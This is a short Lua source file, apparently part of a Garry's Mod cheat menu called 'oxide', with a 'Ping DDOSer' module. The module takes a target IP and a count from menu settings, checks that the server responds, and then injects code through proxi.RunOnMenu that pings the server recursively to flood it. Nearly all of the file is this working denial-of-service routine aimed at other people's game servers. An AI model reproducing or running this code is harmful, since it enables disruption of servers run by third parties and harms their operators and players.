/*
              _     __   
  ____  _  __(_)___/ /__ 
 / __ \| |/_/ / __  / _ \
/ /_/ />  </ / /_/ /  __/
\____/_/|_/_/\__,_/\___/ 
    by paradox & rari
*/

//-/~ Table
DDOS = { }

//-/~ Start
function DDOS:Start( IP, Count )
    if not IP or not Count then 
        return 
    end

    Main:ConsoleInsert( 'SYSTEM', 'Starting execution on IP: `' .. IP .. '`', Color( 255, 87, 51 ) )

    -- Make sure this is valid.
    proxi.RunOnMenu( string.format( 'validServer = false serverlist.PingServer( "%s", function( v ) validServer = isnumber( v ) end )', IP ) )

    timer.Simple( 5, function( )
        local Valid = proxi.RunOnMenu( [[if not validServer then error( "Couldn't fetch server!" ) end]] )

        if not Valid then 
            Main:ConsoleInsert( 'SYSTEM', 'Invalid IP: `' .. IP .. '`', Color( 255, 87, 51 ) )
            return
        end

        proxi.RunOnMenu( string.format( [[ local IP, Max = '%s', %s local function Query( IP, Count ) if Count >= Max then return end serverlist.PingServer( IP, function( Ping, ... ) if not Ping then return end Query( IP, Count + 1 ) end ) end Query( IP, 0 ) ]], IP, Count ) )
    end )
end

//-/~ Check
function DDOS:Check( )
    if not Main.Elements[ 'Miscellaneous' ][ 'Main' ][ 'Ping DDOSer' ] then return end

    return DDOS:Start( Main.Elements[ 'Miscellaneous' ][ 'Main' ][ 'Ping DDOSer IP' ], Main.Elements[ 'Miscellaneous' ][ 'Main' ][ 'Pings' ] )
end